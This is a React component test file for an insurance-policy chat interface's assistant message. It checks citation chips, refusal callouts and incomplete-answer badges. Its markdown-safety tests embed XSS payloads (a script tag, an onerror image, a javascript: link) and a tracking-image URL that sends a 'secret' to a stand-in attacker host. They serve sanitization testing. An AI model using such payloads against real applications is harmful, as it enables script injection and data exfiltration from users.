import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import type { ClauseCiteUIMessage, SourceRef } from '@/lib/types';
import { AssistantMessage } from './assistant-message';

const source = (n: number, clauseId: string): SourceRef => ({
  n,
  chunkId: `c${n}`,
  documentId: 'd',
  slug: 'star',
  documentTitle: 'Star Comprehensive',
  insurer: 'Star',
  clauseId,
  clauseIds: [clauseId],
  sectionPath: ['Section C: Exclusions'],
  pageStart: 3,
  pageEnd: 3,
  content: `text ${clauseId}`,
  rerankScore: 0.9,
});

const msg = (parts: ClauseCiteUIMessage['parts']): ClauseCiteUIMessage => ({
  id: 'a1',
  role: 'assistant',
  parts,
});

const meta = (over: Record<string, unknown>) => ({
  type: 'data-meta' as const,
  data: {
    messageId: 'a1',
    conversationId: 'c',
    status: 'complete' as const,
    answer: '',
    citations: [],
    uncited: false,
    usage: null,
    latencyMs: {},
    rerankDegraded: false,
    suggestions: [],
    ...over,
  },
});

describe('AssistantMessage', () => {
  it('renders the cleaned meta answer with clickable chips for valid citations only', async () => {
    const onCite = vi.fn();
    render(
      <AssistantMessage
        onCite={onCite}
        message={msg([
          {
            type: 'data-sources',
            data: { conversationId: 'c', question: 'q', sources: [source(1, 'C.3')] },
          },
          { type: 'text', text: 'Raw streamed [1] and bogus [9].' },
          meta({
            answer: 'Cataract waits **24 months** [1].',
            citations: [
              { n: 1, chunkId: 'c1', documentId: 'd', clauseId: 'C.3', pageStart: 3, pageEnd: 3 },
            ],
          }),
        ])}
      />,
    );
    expect(screen.queryByText(/bogus/)).toBeNull();
    expect(screen.getByText('24 months')).toBeInTheDocument();
    await userEvent.click(screen.getByRole('button', { name: /source 1/i }));
    expect(onCite).toHaveBeenCalledWith(expect.objectContaining({ clauseId: 'C.3' }));
  });

  it('shows a refusal callout with clickable suggestions', async () => {
    const onCite = vi.fn();
    render(
      <AssistantMessage
        onCite={onCite}
        message={msg([
          { type: 'data-sources', data: { conversationId: 'c', question: 'q', sources: [] } },
          meta({
            status: 'refused',
            answer: 'I could not find an answer…',
            suggestions: [source(1, 'B.2')],
          }),
        ])}
      />,
    );
    expect(screen.getByText(/not found in the selected policies/i)).toBeInTheDocument();
    await userEvent.click(screen.getByRole('button', { name: /B\.2/ }));
    expect(onCite).toHaveBeenCalledWith(expect.objectContaining({ clauseId: 'B.2' }));
  });

  it('turns every streamed [n] into a chip while no meta has arrived yet', () => {
    render(
      <AssistantMessage
        onCite={vi.fn()}
        message={msg([
          {
            type: 'data-sources',
            data: {
              conversationId: 'c',
              question: 'q',
              sources: [source(1, 'C.3'), source(2, 'C.4')],
            },
          },
          { type: 'text', text: 'Streaming [1] then [2] then [5].' },
        ])}
      />,
    );
    expect(screen.getByRole('button', { name: /source 1/i })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /source 2/i })).toBeInTheDocument();
    expect(screen.queryByRole('button', { name: /source 5/i })).toBeNull();
    expect(screen.getByText(/then \[5\]\./)).toBeInTheDocument();
  });

  it('keeps the same chip element while more text streams in, so a click is never lost to a remount', () => {
    const parts = (text: string): ClauseCiteUIMessage['parts'] => [
      {
        type: 'data-sources',
        data: { conversationId: 'c', question: 'q', sources: [source(1, 'C.3')] },
      },
      { type: 'text', text },
    ];
    const { rerender } = render(
      <AssistantMessage onCite={vi.fn()} message={msg(parts('Waits [1]'))} />,
    );
    const chip = screen.getByRole('button', { name: /source 1/i });
    rerender(<AssistantMessage onCite={vi.fn()} message={msg(parts('Waits [1] 24 months'))} />);
    expect(screen.getByRole('button', { name: /source 1/i })).toBe(chip);
  });

  it('flags an answer without citations as uncited', () => {
    render(
      <AssistantMessage
        onCite={vi.fn()}
        message={msg([
          {
            type: 'data-sources',
            data: { conversationId: 'c', question: 'q', sources: [source(1, 'C.3')] },
          },
          meta({ answer: 'General remark.', uncited: true }),
        ])}
      />,
    );
    expect(screen.getByText('uncited')).toBeInTheDocument();
  });
});

/** A finished answer with five retrieved sources of which only [1] was actually cited. */
function answered(answer: string, onCite = vi.fn()) {
  return render(
    <AssistantMessage
      onCite={onCite}
      message={msg([
        {
          type: 'data-sources',
          data: {
            conversationId: 'c',
            question: 'q',
            sources: [1, 2, 3, 4, 5].map((n) => source(n, `C.${n}`)),
          },
        },
        meta({
          answer,
          citations: [
            { n: 1, chunkId: 'c1', documentId: 'd', clauseId: 'C.1', pageStart: 3, pageEnd: 3 },
          ],
        }),
      ])}
    />,
  );
}

describe('AssistantMessage markdown safety', () => {
  it('never renders raw HTML as live elements', () => {
    const { container } = answered(
      'Before <script>alert(1)</script> <img src=x onerror="alert(2)"> <iframe src="https://evil"></iframe> after [1].',
    );
    expect(container.querySelector('script, img, iframe')).toBeNull();
    expect(container.querySelector('[onerror]')).toBeNull();
    expect(screen.getByRole('button', { name: /source 1/i })).toBeInTheDocument();
  });

  it('does not render markdown images, which would let an answer ping a remote server', () => {
    const { container } = answered(
      'Look ![tracking pixel](https://evil.example/x.png?q=secret) here [1].',
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('evil.example');
  });

  it('renders a javascript: link as plain text, not as an anchor', () => {
    const { container } = answered('Click [here](javascript:alert(1)) now [1].');
    expect(screen.getByText(/Click here now/)).toBeInTheDocument();
    expect(container.querySelector('a')).toBeNull();
    expect(container.innerHTML).not.toContain('javascript:');
  });

  it('renders links with an empty or non-web target as plain text', () => {
    const { container } = answered('A [empty]() and [local](#section) and [rel](/admin) link [1].');
    expect(container.querySelector('a')).toBeNull();
    expect(screen.getByText(/A empty and local and rel link/)).toBeInTheDocument();
  });

  it('keeps ordinary https links, opened safely in a new tab', () => {
    answered('See [the IRDAI site](https://irdai.gov.in/page) [1].');
    const link = screen.getByRole('link', { name: 'the IRDAI site' });
    expect(link).toHaveAttribute('href', 'https://irdai.gov.in/page');
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'));
  });

  it('makes a chip only for a citation the server validated, even when the source exists', () => {
    answered('Valid [1] but a forged link [5](#cite-5).');
    expect(screen.getByRole('button', { name: /source 1/i })).toBeInTheDocument();
    expect(screen.queryByRole('button', { name: /source 5/i })).toBeNull();
    expect(screen.getByText(/forged link \[5\]\./)).toBeInTheDocument();
  });
});

describe('AssistantMessage details', () => {
  it('is memoized so finished messages skip re-rendering while a new one streams', () => {
    expect((AssistantMessage as unknown as { $$typeof: symbol }).$$typeof).toBe(
      Symbol.for('react.memo'),
    );
  });

  it('shows the lead of a refusal and its verify line, without repeating the clause list', () => {
    render(
      <AssistantMessage
        onCite={vi.fn()}
        message={msg([
          { type: 'data-sources', data: { conversationId: 'c', question: 'q', sources: [] } },
          meta({
            status: 'refused',
            answer:
              "I could not find an answer to this in the selected policies, so I will not guess.\n\nThe closest clauses I found were:\n- Star Comprehensive — clause B.2 (p. 3)\n\nPlease verify against your policy schedule and the insurer's latest wording.",
            suggestions: [source(1, 'B.2')],
          }),
        ])}
      />,
    );
    expect(screen.getByText(/I could not find an answer to this/)).toBeInTheDocument();
    expect(screen.getByText(/Please verify against your policy schedule/)).toBeInTheDocument();
    expect(screen.queryByText(/The closest clauses I found were/)).toBeNull();
  });

  it('marks an answer that ended without its final meta as incomplete, but not one still streaming', () => {
    const parts: ClauseCiteUIMessage['parts'] = [
      {
        type: 'data-sources',
        data: { conversationId: 'c', question: 'q', sources: [source(1, 'C.3')] },
      },
      { type: 'text', text: 'Half an answer [1] and [4]' },
    ];
    const { rerender } = render(
      <AssistantMessage onCite={vi.fn()} message={msg(parts)} streaming />,
    );
    expect(screen.queryByText('incomplete')).toBeNull();
    rerender(<AssistantMessage onCite={vi.fn()} message={msg(parts)} />);
    expect(screen.getByText('incomplete')).toBeInTheDocument();
    // Chips only for sources that exist: [4] has none.
    expect(screen.getByRole('button', { name: /source 1/i })).toBeInTheDocument();
    expect(screen.queryByRole('button', { name: /source 4/i })).toBeNull();
  });

  it('shows no incomplete badge once the final meta arrived', () => {
    render(
      <AssistantMessage
        onCite={vi.fn()}
        message={msg([
          { type: 'data-sources', data: { conversationId: 'c', question: 'q', sources: [] } },
          meta({ answer: 'Done.' }),
        ])}
      />,
    );
    expect(screen.queryByText('incomplete')).toBeNull();
  });
});
